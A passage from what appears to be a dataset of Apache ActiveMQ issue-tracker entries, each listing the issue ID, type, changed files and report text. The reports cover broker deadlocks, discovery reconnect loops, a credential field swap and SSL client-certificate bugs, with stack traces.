The thread that gets stuck in the wait is:ActiveMQ Connection Dispatcher: 8012937" daemon prio=6 tid=0x04565400 nid=0xb4 in Object.wait() [0x051bf000..0x051bfd18]  java.lang.Thread.State: WAITING (on object monitor)       at java.lang.Object.wait(Native Method)       - waiting on <0x0a71db28> (a java.lang.Object)       at java.lang.Object.wait(Object.java:485)       at org.apache.activemq.thread.DedicatedTaskRunner.shutdown(DedicatedTaskRunner.java:70)       - locked <0x0a71db28> (a java.lang.Object)       at org.apache.activemq.broker.AbstractConnection.stop(AbstractConnection.java:190)       at org.apache.activemq.broker.TransportConnection.stop(TransportConnection.java:95)       at org.apache.activemq.broker.AbstractConnection.processShutdown(AbstractConnection.java:389)       at org.apache.activemq.command.ShutdownInfo.visit(ShutdownInfo.java:35)       at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:315)       at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:63)       at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:91)       at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:63)       at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:76)       at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)       at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:58)       at org.apache.activemq.network.DemandForwardingBridgeSupport.stop(DemandForwardingBridgeSupport.java:296)       at org.apache.activemq.util.ServiceSupport.dispose(ServiceSupport.java:39)       at org.apache.activemq.network.DiscoveryNetworkConnector.onServiceRemove(DiscoveryNetworkConnector.java:154)       at org.apache.activemq.transport.discovery.simple.SimpleDiscoveryAgent.serviceFailed(SimpleDiscoveryAgent.java:117)       at org.apache.activemq.network.DiscoveryNetworkConnector$2.fireServiceFailed(DiscoveryNetworkConnector.java:254)       at org.apache.activemq.network.DiscoveryNetworkConnector$2.serviceLocalException(DiscoveryNetworkConnector.java:241)       at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:536)       at org.apache.activemq.network.DemandForwardingBridgeSupport$1.onCommand(DemandForwardingBridgeSupport.java:118)       at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:91)       at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:63)       at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:76)       at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:47)       - locked <0x0a71de08> (a java.lang.Object)       at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:58)       at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:213)       at org.apache.activemq.broker.AbstractConnection.processDispatch(AbstractConnection.java:842)       at org.apache.activemq.broker.AbstractConnection.iterate(AbstractConnection.java:879)       at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:100)       at org.apache.activemq.thread.DedicatedTaskRunner.access$000(DedicatedTaskRunner.java:24)       at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:38)
issueID:AMQ-1341
type:Improvement
changed files:RegionBroker.java
texts:Improve the InvalidClientIDException message so that we know where the previous connection was established from.
None
issueID:AMQ-1342
type:Bug
changed files:MulticastDiscoveryAgent.java
texts:Multicast Discovery Agent can get into a tight loop reconnecting if the network connection fails to get established
If the multicast discovery agent discovers a bogus broker which is not properly accepting connections, a tight loop can occur where the discovery agent continually discovers the bogus broker.
issueID:AMQ-1343
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:Network conntions not shutdown propertly when a InvalidClientIDException occurs
None
issueID:AMQ-1344
type:Bug
changed files:RegionBroker.java
texts:Deadlock can occur when cerating and deleting many destinations concurrently
None
issueID:AMQ-1345
type:Bug
changed files:MessageResourceAdapter.java
texts:XBean annotation &#39;resourceAdapter&#39; is specified twice
The "resourceAdapter" XBean annotation is specified on both the org.apache.activemq.ra.MessageResourceAdapter interface and the org.apache.activemq.ra.ActiveMQResourceAdapter class
issueID:AMQ-1346
type:Bug
changed files:Queue.java
texts:Unexpected IllegalStateException when using the VMPendingQueueMessageStoragePolicy
2007-07-26 21:17:19,349 [enerContainer-1] ERROR efaultMessageListenerContainer - Setup of JMS message listener invoker failed - trying to recoverjavax.jms.JMSException: java.lang.IllegalStateException at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:46) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1229) at org.apache.activemq.ActiveMQSession.syncSendPacket(ActiveMQSession.java:1804) at org.apache.activemq.ActiveMQMessageConsumer.<init>(ActiveMQMessageConsumer.java:197) at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:927) at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.createConsumer(AbstractPollingMessageListenerContainer.java:437) at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.createListenerConsumer(AbstractPollingMessageListenerContainer.java:216) at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.initResourcesIfNecessary(DefaultMessageListenerContainer.java:887) at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:870) at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:811) at java.lang.Thread.run(Thread.java:613)Caused by: java.lang.IllegalStateException at java.util.LinkedList$ListItr.remove(LinkedList.java:590) at org.apache.activemq.broker.region.cursors.VMPendingMessageCursor.remove(VMPendingMessageCursor.java:88) at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1015) at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:996) at org.apache.activemq.broker.region.Queue.addSubscription(Queue.java:216) at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:240) at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:344) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86) at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:83) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86) at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:96) at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:561) at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:313) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:279) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:65) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:133) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:126) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:85) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:137) ... 1 more
issueID:AMQ-1348
type:Bug
changed files:
texts:StoreTest.testLock() fails due to java.io.IOException: The process cannot access the file because another process has locked a portion of the file on Windows
java.io.IOException: The process cannot access the file because another process has locked a portion of the file at java.io.RandomAccessFile.readBytes(Native Method) at java.io.RandomAccessFile.read(Unknown Source) at java.io.RandomAccessFile.readFully(Unknown Source) at java.io.RandomAccessFile.readFully(Unknown Source) at org.apache.activemq.kaha.impl.index.StoreIndexReader.readItem(StoreIndexReader.java:46) at org.apache.activemq.kaha.impl.index.IndexManager.initialize(IndexManager.java:177) at org.apache.activemq.kaha.impl.index.IndexManager.<init>(IndexManager.java:55) at org.apache.activemq.kaha.impl.KahaStore.getIndexManager(KahaStore.java:358) at org.apache.activemq.kaha.impl.KahaStore.initialize(KahaStore.java:428) at org.apache.activemq.kaha.impl.KahaStore.doesListContainerExist(KahaStore.java:250) at org.apache.activemq.kaha.impl.KahaStore.doesListContainerExist(KahaStore.java:246) at org.apache.activemq.kaha.StoreTest.testLock(StoreTest.java:192) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at junit.framework.TestCase.runTest(TestCase.java:154) at junit.framework.TestCase.runBare(TestCase.java:127) at junit.framework.TestResult$1.protect(TestResult.java:106) at junit.framework.TestResult.runProtected(TestResult.java:124) at junit.framework.TestResult.run(TestResult.java:109) at junit.framework.TestCase.run(TestCase.java:118) at org.eclipse.jdt.internal.junit.runner.junit3.JUnit3TestReference.run(JUnit3TestReference.java:130) at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:460) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:673) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:386) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:196)
issueID:AMQ-1349
type:Test
changed files:
texts:ReliableReconnectTest is failing due to a NullPointerException
None
issueID:AMQ-1356
type:Bug
changed files:
texts:Durable Subscriptions do not work with Wildcards after broker is restarted.
When the broker is restarted, due to the way subscriptions are stored in the database, the broker does not know that the durable subscription was a wild card.  It just knows what topics were associated via the wild card.  New messages sent to new destinations that would have matched the wild card would will not get associated with the durable subscription.We need to store the original wild card pattern in the persistence store to solve this problem.
issueID:AMQ-1358
type:Improvement
changed files:
texts:Make timestamp legible in web interface
In the web interface to ActiveMQ 5.0 there"s a timestamp column. This shows what appear to be long values such as 1186523051750, 1186523051754, etc. I suspect these are something like the number of milliseconds since January 1, 1970, midnight.However since the web interface to the queue is meant to be shown to a person, these should really be converted to a more readable String format such as 2007-08-07T14:06:22.34Z or something even nicer.
issueID:AMQ-1361
type:Improvement
changed files:LogWriter.java
UdpTransportFactory.java
TransportLoggerControl.java
BrokerView.java
default
TcpTransport.java
TcpTransportServer.java
BrokerViewMBean.java
TransportLoggerFactory.java
SslTransportFactory.java
DefaultLogWriter.java
LogWriterFinder.java
custom
TransportLogger.java
CustomLogWriter.java
TcpTransportFactory.java
TransportLoggerControlMBean.java
TransportLoggerViewMBean.java
TransportLoggerView.java
texts:Logging improvement contribution
Hello people,After our proposal some time ago (view http://www.nabble.com/Logging-improvement-proposal-tf3570794s2354.html#a9976200), we would like to add a little contribution to the ActiveMQ code, and we hope that the ActiveMQ developers and users like it.We thought it would be good to improve ActiveMQ logging"s capabilities, in order to make debugging, tracing, and understanding ActiveMQ easier.For this, we have added customization of ActiveMQ"s Transport level logging, allowing users to write their own logging formats. Also, we have added dynamic control of this logging functions (via JMX). We have also developed a simple tool to analyze the log files produced.We have split the contribution into 2 patches, one to add customized log formats functionality, and the other to add dynamic management of logging via JMX. 1st patch is against SVN rev. 564978. 2nd patch is against 1st patch (incremental).A. New features(1) Logging enhancements (1st patch):It is now possible to customize what will be written to the log file at transport level, by writing a custom class which implements the new LogWriter interface.Also, the option: logWriterName = name has to be added to a transport URI to choose which class (format) will be used (more details on how to implement your own class / format later).To activate transport logging, the trace=true flag has to be used.People who don"t want to use the new functionality will not have to change their URI"s.(2) Dynamic control of logging enhancements (2nd patch):(a) Added ability to reload log4j.properties file to the BrokerView MBean.(b) If the option dynamicManagement=true is appended to the URI, transport logging can be managed through JMX: -Logging can be switched on / off for every transport or for all of them at once. -If the option startLogging=false is appended to the URI, a transport will initially not log, but a TransportLogger instance will be created, and later it can be activated by JMX. -Another option lets the user change the JMX port used for these functions.(3) Log parsing and analysis tool:The tool parses log files (any number of them) of the CustomLogWriter format (our own implementation of the LogWriter interface) and has the following features:(a) The tool detects incorrect situations at Transport level: sent but not received messages, duplicate messages at transport level.(b) The tool can show the communication sequence for a message ("travel path" of a message).(c) Other features: (c1) Loading of log files is done by choosing a directory with them. (c2) Incorrect features can be filtered per type or per connection. (c3) Long, hard to read connection / client IDs can be replaced by short, easy to compare IDs. (c4) Summary of connections, producers, consumers, log files.Some screen shots are included.(Continues on first comment)
issueID:AMQ-1363
type:Bug
changed files:Main.java
texts:activemq/conf/log4j.properties does not seem to get recognized
Try taking a binary build; enabling debug logging by editing activemq/conf/log4j.properties, then rerunning the broker. I get no change!BTW I"ve patched the activemq-core-*-tests.jar to not include a log4j.properties file. Also I tried adding the activemq/conf directory explicitly in the console - to no avail.I also tried zapping the activeio jars and grepping the jars to see if any had any included log4j.properties files - to no avail
issueID:AMQ-1365
type:Bug
changed files:ConnectionKey.java
texts:Username and password field got swapped when calling PooledConnection.createConnection
When using org.apache.activemq.pool.PooledConnection createConnection(username, password), the username and password fields are swapped.I think the problem could be the following, based in 4.1.1 source code, PooledConnection.java line 77    public synchronized Connection createConnection(String userName, String password) throws JMSException {        ConnectionKey key = new ConnectionKey(userName, password);ConnectionKey.java line 30    public ConnectionKey(String password, String userName) {        this.password = password;        this.userName = userName;
issueID:AMQ-1377
type:Improvement
changed files:
texts:amq.js should not have a dependency on prototype.js
amq.js uses a script loading technique to include behavior.js, prototype.js and _amq.js. The Behavior library is included only for the purposes of the chat client and is only GUI in nature, so that should go. Also, Prototype is included for its AJAX functionality, however everyone has their favorite javascript library and although I cut my teeth on prototype, I use jQuery now. I certainly don"t want amq.js to include prototype when I have a perfectly good AJAX library already included in jQuery.IMHO, amq.js should include only the functionality of client-side javascript-enabled JMS. The page author should include her AJAX library of choice (prototype, dojo, jquery, mootools, etc.) and an adapter class that allows amq.js to use the particular ajax library.
issueID:AMQ-1380
type:Bug
changed files:
texts:ActiveIO does not close ControlFile
The following exception is thrown from an ActiveMQ instance that is in Slave mode that causes it to crash.java.io.FileNotFoundException: **/*****/***/******/journal/control.dat (Too many open files)        at java.io.RandomAccessFile.open(Native Method)        at java.io.RandomAccessFile.<init>(RandomAccessFile.java:212)        at org.apache.activeio.journal.active.ControlFile.<init>(ControlFile.java:60)        at org.apache.activeio.journal.active.LogFileManager.initialize(LogFileManager.java:119)        at org.apache.activeio.journal.active.LogFileManager.<init>(LogFileManager.java:102)        at org.apache.activeio.journal.active.JournalImpl.<init>(JournalImpl.java:101)        at org.apache.activemq.store.DefaultPersistenceAdapterFactory.createJournal(DefaultPersistenceAdapterFactory.java:224)        at org.apache.activemq.store.DefaultPersistenceAdapterFactory.getJournal(DefaultPersistenceAdapterFactory.java:132)        at org.apache.activemq.store.DefaultPersistenceAdapterFactory.createPersistenceAdapter(DefaultPersistenceAdapterFactory.java:70)        at org.apache.activemq.store.PersistenceAdapterFactoryBean.getObject(PersistenceAdapterFactoryBean.java:35)        at org.springframework.beans.factory.support.AbstractBeanFactory.getObjectFromFactoryBean(AbstractBeanFactory.java:994)        ... 41 moreThe problem is that each time ActiveIO checks to see if control.dat is locked it creates a new java.io.RandomAccessFile.  If the control.dat file is locked, it fails to close the RandomAccessFile.This exception always will be thrown from an instance in Shared-File-System Slave mode that continues to check the Journal file (which the Master has locked).  But the rate at which is is thrown depends on the maximum number of files the OS allows to be open.  You can check how many files are open with "ulimit -a"
issueID:AMQ-1381
type:Bug
changed files:SslTransport.java
texts:Client Certificates do not work due to incorrectly overriden method in SslTransport.java
The peer certificates never get added to the ConnectionInfo (setTransportContext)since doConsume() in SslTransport has the wrong signature.The correct signature is:doConsume(Object command)but SslTransport defines a method with the following signature:doConsume(Command command)Which will obviously never get called.In its current state, it is impossible for client certificates to work.See attached patch for fix. Apply with patch -p0 < activemq-clientcert.patch or simply change Command to Objectin SslTransport.java
issueID:AMQ-1382
type:Bug
changed files:BrokerService.java
TopicSubscription.java
Queue.java
texts:Unnecessary creation of /activemq-data/localhost/tmp_storage directory with AMQ 5.x
With AMQ 5.0 everytime AMQ runs the following directory structure is created:/activemq-data/localhost/tmp_storage.This didn"t happen in AMQ 4.1.0.X and looks to be a side effect of the new temporary spooling feature in 5.x.Since the broker is configured to be non-persistent, ActiveMQ should not be creating this directory.
issueID:AMQ-1385
type:Bug
changed files:URISupport.java
texts:URISupport.parseComposite() incorrectly decodes URI parts
org.apache.activemq.util.URISupport.parseComposite() throws an URISyntaxException for some input URIs.
issueID:AMQ-1429
type:New Feature
changed files:
texts:Package ActiveMQ as OSGi bundles instead of plain jars
None
issueID:AMQ-1434
type:Improvement
changed files:ActiveMQConnectionFactory.java
texts:allow the TransportListener to be configured on an ActiveMQConnectionFactory for easier working with Spring JmsTemplate / MessageListenerContainer
None
issueID:AMQ-1435
type:New Feature
changed files:
texts:support mirrored queues to make it easier to monitor message flows via a topic (or queue via virtual topics) for things like BAM or monitoring etc
Mirrored queues would be very handy; so that if enabled folks can monitor a virtual topic to see messages being delivered to a topic; while being out of band of the queue message flow. i.e. so that any existing queue based application works as before, but meanwhile other services can consume those same messages via a topic or virtual topic
issueID:AMQ-1436
type:Bug
changed files:ConnectionDotFileInterceptor.java
texts:Using the connectionDotFilePlugin with a Broker not named localhost causes a NullPointerException
To recrate, define a broker in your ActiveMQ config file and specify the name, e.g.:<broker brokerName="MyBroker" useJmx="true" persistent="true" xmlns="http://activemq.org/config/1.0">        <plugins>                <connectionDotFilePlugin />        </plugins -->When starting the container a NPE is thrown if no broker called "localhost" is present.  Changing the name of the broker above to "localhost" stops the problem and the .dot files is generated normally.FYI The problem appears to be in:   http://activemq.apache.org/maven/activemq-core/xref/org/apache/activemq/broker/view/ConnectionDotFileInterceptor.html...specifically the hardcoded string in this line is in the constuctor:   ObjectName brokerName = new ObjectName(domain + ":Type=Broker,BrokerName=localhost");
issueID:AMQ-1438
type:Bug
changed files:
texts:When in XA Transaction Active-MQ integrated with OpenEJB hangs in the isSameRM method of LocalAndXATransaction.
I was facing a problem with the AMQ 4.1 with the LocalAndXATransaction class"s isSameRM waiting indefinitely. The wait is because waitForBrokerInfo calls brokerInfoReceived.await()where brokerInfoReceived is a countdown latch. Once this is waiting itnever gets resumed.To trigger it the method onCommand(final Object o) has to be called onorg.apache.activemq.ActiveMQConnection.
issueID:AMQ-1440
type:Improvement
changed files:FanoutTransport.java
texts:Allow minAckCount to have std set/get methods
Add standard bean get/set methods for minAckCount to allow it to be set in URI syntax.see http://www.nabble.com/FanoutTransport-Patches-tf4562939s2354.html
issueID:AMQ-1444
type:Improvement
changed files:BrokerView.java
BrokerService.java
BrokerViewMBean.java
texts:Methods to support dynamic add/remove for connectors through JMX
Update BrokerViewMBean and supporting classes to provide dynamic connector add/remove through JMX.
issueID:AMQ-1445
type:Bug
changed files:DiskIndexLinkedList.java
texts:RecoveryListenerAdapter - Message id ID... could not be recovered from the data store!
My application works correctly with JDBC persistence using derby, or indeed with no persistence turned on.If I use the AMQ store however, very early on in the application"s run, I get the following error, and then my application hangs.  This happens for both the VM and TCP transports.&#91;VMTransport&#93; 35346 ERROR org.apache.activemq.store.amq.RecoveryListenerAdapter - Message id ID:tamarama-60079-1191564856100-2:2:3:3:4 could not be recovered from the data store!I have attached a debug trace of the application, which shows the lifetime of message tamarama-60079-1191564856100-2:2:3:3:4.
issueID:AMQ-1446
type:Bug
changed files:MemoryPersistenceAdapter.java
texts:org.apache.activemq.store.memory.MemoryPersistenceAdapter - Expected an instance of MemoryMessageStore but was: org.apache.activemq.store.memory.MemoryTransactionStore$2@a0f3d1
I have an application which ran with persistence off, but with transactions.  I noticed just before stopping the broker, I see the following messages:WARN  org.apache.activemq.store.memory.MemoryPersistenceAdapter - Expected an instance of MemoryMessageStore but was: org.apache.activemq.store.memory.MemoryTransactionStore$2@a0f3d1WARN  org.apache.activemq.store.memory.MemoryPersistenceAdapter - Expected an instance of MemoryMessageStore but was: org.apache.activemq.store.memory.MemoryTransactionStore$1@e7332dWARN  org.apache.activemq.store.memory.MemoryPersistenceAdapter - Expected an instance of MemoryMessageStore but was: org.apache.activemq.store.memory.MemoryTransactionStore$1@d10008It doesn"t seem to have affected anything, but I thought it was worth reporting.  I see this in revision 582029.
issueID:AMQ-1449
type:Bug
changed files:DurableTopicSubscription.java
AbstractPendingMessageCursor.java
PendingMessageCursor.java
FilePendingMessageCursor.java
VMPendingMessageCursor.java
texts:Producer hangs on durable subscribe as Usage memory runs over
Broker hangs on a durable subscribe when producer is disconnected violently (System.exit()). I have included the test files to reproduce the problemWARNING: The test cases included can be patched against activemq-core but are not unit tests. Do the following sequence1.) Run the junit test DurableProducerConsumerBrokerTest. This starts a broker 2.) Run the junit test DurableProducerConsumerTest. It will exit with System.exit midway thru running the test3.) Rerun the junit test DurableProducerConsumerTest...It should hang the second time aroundNote: If you use the log4j.properties included in the patch you would see the Usage memory as it rises above 70 to 99+ in the second run.
issueID:AMQ-1451
type:Bug
changed files:FailoverTransport.java
texts:FailoverTransport bad handling of InterruptedException in wait loop.
The forum post http://www.nabble.com/Infinite-loop-if-FailoverTransport-is-interrupted-tf3758516s2354.html#a10799543 refers to this issue.The InterruptedException should be propagated.  In addition, after the thread is interrupted, It starts spinning without waiting because the wait() call is immediately exit due to the Thread.currentThread().interrupt()  invoked in the catch block.
issueID:AMQ-1452
type:Bug
changed files:
texts:Duplicate messages dispatched when using AMQ Store
This issue was originally reported on activemq-user here: http://www.nabble.com/Duplicate-message-delivered-to-consumers-on-queue-with-kaha-persistence-tf4560327s2354.html.When I initially reported this issue, Rob suggested to not use Kaha persistence, but using the AMQ store.  This seemed to resolve the issue.Unfortunately, I have seen another situation where a duplicate message is being re-delivered, it turns out to the same consumer.  I have tried in vain to create a unit test to reproduce this, but have been unable to do so.The offending message ID is ID:tamarama-63606-1191905255404-2:2:3:3:1, and if you look at the attached debug trace, you can see it being sent to a queue, read from a queue, and then being dispatched a second time.  The same worker thread in this case was the producer and the consumer of message.This issue does not occur when persistence is not enabled.This is seen with revision 583015.
issueID:AMQ-1456
type:Bug
changed files:JmsTopicConnector.java
JmsQueueConnector.java
JmsConnector.java
texts:JMS to JMS Bridge property consumerName on InboundTopicBridge element dont work
JMS to JMS Bridge don"t work with attribute consumerName in inboundTopicBridge  element.see http://activemq.apache.org/jms-to-jms-bridge.html#JMStoJMSBridge-TopicBridges consumerName if set will create a durable consumerMy configuration :  <jmsBridgeConnectors>   <jmsTopicConnector name="testBridge" jndiOutboundTemplate="#remoteJndi"    outboundTopicConnectionFactoryName="jms.TopicConnectionFactory" localTopicConnectionFactory="#localFactory">    <outboundTopicBridges>     <outboundTopicBridge outboundTopicName="jms.ReplyMessageTopic" localTopicName="Test.bridge" />    </outboundTopicBridges>    <inboundTopicBridges>     <inboundTopicBridge inboundTopicName="jms.ReplyMessageTopic" localTopicName="Test.bridge" consumerName="testBridge"/>    </inboundTopicBridges>   </jmsTopicConnector>  </jmsBridgeConnectors>When I execute attached test (in patch file), I haved this stacktrace :org.springframework.beans.factory.BeanCreationException: Error creating bean with name "localbroker" defined in class path resource [org/apache/activemq/network/jms/topic-config.xml]: Invocation of init method failed; nested exception is javax.jms.JMSException: You cannot create a durable subscriber without specifying a unique clientID on a ConnectionCaused by: javax.jms.JMSException: You cannot create a durable subscriber without specifying a unique clientID on a Connection at org.apache.activemq.ActiveMQConnection.checkClientIDWasManuallySpecified(ActiveMQConnection.java:1138) at org.apache.activemq.ActiveMQSession.createDurableSubscriber(ActiveMQSession.java:1066) at org.apache.activemq.ActiveMQSession.createDurableSubscriber(ActiveMQSession.java:1013) at org.apache.activemq.ActiveMQTopicSession.createDurableSubscriber(ActiveMQTopicSession.java:144) at org.apache.activemq.network.jms.TopicBridge.createConsumer(TopicBridge.java:68) at org.apache.activemq.network.jms.DestinationBridge.start(DestinationBridge.java:103) at org.apache.activemq.network.jms.JmsConnector.start(JmsConnector.java:118) at org.apache.activemq.broker.BrokerService.startAllConnectors(BrokerService.java:1494) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:402)
issueID:AMQ-1464
type:Bug
changed files:
texts:AMQ 5.0 Fanout Regression
On 4.1.1, the fanout transport works as expected. My producer is fanning out message sends (queues) to two unrelated message brokers and clients connected to both those brokers get the messages.However, when I run the same exact test under 5.0 (the 10/10 SNAPSHOT), fanout no longer works as expected   Only the 5.0 broker that my producer first connects with gets the messages. The second broker never gets the messages and hurls this exception.ERROR Service      - Async error occurred: java.lang.IllegalStateException: Cannot remove a consumer that had not been registered: ID:DIEGO-3739-1192470567781-0:0:-1:1java.lang.IllegalStateException: Cannot remove a consumer that had not been registered: ID:DIEGO-3739-1192470567781-0:0:-1:1        at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:547)        at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:64)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:281)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:67)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:134)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:124)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:183)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:170)        at java.lang.Thread.run(Thread.java:595)Joe
issueID:AMQ-1465
type:Bug
changed files:NetworkConnector.java
MulticastNetworkConnector.java
LdapNetworkConnector.java
DiscoveryNetworkConnector.java
NetworkBridgeConfiguration.java
texts:Regression with networkConnector &#39;name&#39; attribute
On 4.1.1, the value assigned to the networkConnector"s  "name" attribute shows up nicely on the jconsole. However, there appears to be a regression with 5.0, because the name no longer shows up on the jconsole. With 5.0, you instead see the String representation of an instance of the SimpleDiscoveryAgent class
issueID:AMQ-1467
type:Bug
changed files:Usage.java
texts:Deadlock between FilePendingMessageCursor and MemoryUsage
Deadlock detected by jconsole. Fairly easy to reproduce with a maven-perf-test-plugin using journaled jdbc persistence. Using the latest 5.0-SNAPSHOT buildActiveMQ TaskName: ActiveMQ TaskState: BLOCKED on java.lang.Object@1ba1894 owned by: ActiveMQ Transport: tcp:///167.235.7.27:4215Total blocked: 1,001  Total waited: 1,002Stack trace: org.apache.activemq.usage.MemoryUsage.increaseUsage(MemoryUsage.java:126)org.apache.activemq.usage.MemoryUsage.increaseUsage(MemoryUsage.java:122)org.apache.activemq.command.Message.incrementReferenceCount(Message.java:585)org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.next(FilePendingMessageCursor.java:198) locked org.apache.activemq.broker.region.cursors.FilePendingMessageCursor@1347d75org.apache.activemq.broker.region.cursors.StoreQueueCursor.next(StoreQueueCursor.java:129) locked org.apache.activemq.broker.region.cursors.StoreQueueCursor@14f3d22org.apache.activemq.broker.region.Queue.buildList(Queue.java:1020) locked org.apache.activemq.broker.region.cursors.StoreQueueCursor@14f3d22 locked org.apache.activemq.broker.region.Queue@1b2591corg.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1002)org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1065)org.apache.activemq.broker.region.Queue.iterate(Queue.java:938)org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:118)org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:42)java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885)java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)java.lang.Thread.run(Thread.java:619)ActiveMQ Transport: tcp://....:xxxxName: ActiveMQ Transport: tcp:///167.235.7.27:4215State: BLOCKED on org.apache.activemq.broker.region.cursors.FilePendingMessageCursor@1347d75 owned by: ActiveMQ TaskTotal blocked: 46  Total waited: 2Stack trace: org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.onUsageChanged(FilePendingMessageCursor.java:260)org.apache.activemq.usage.Usage.fireEvent(Usage.java:254)org.apache.activemq.usage.Usage.setPercentUsage(Usage.java:224) locked java.lang.Object@1ba1894org.apache.activemq.usage.MemoryUsage.decreaseUsage(MemoryUsage.java:149)org.apache.activemq.usage.MemoryUsage.decreaseUsage(MemoryUsage.java:142)org.apache.activemq.command.Message.decrementReferenceCount(Message.java:601) locked org.apache.activemq.command.ActiveMQTextMessage@960b08org.apache.activemq.broker.region.IndirectMessageReference.drop(IndirectMessageReference.java:137) locked org.apache.activemq.broker.region.IndirectMessageReference@ae7918org.apache.activemq.broker.region.QueueSubscription.acknowledge(QueueSubscription.java:56)org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:193) locked org.apache.activemq.broker.region.QueueSubscription@1e13a2corg.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:340)org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:427)org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:73)org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:73)org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:87)org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:478)org.apache.activemq.command.MessageAck.visit(MessageAck.java:196)org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:319)org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:216)org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:67)org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:134)org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:124) locked 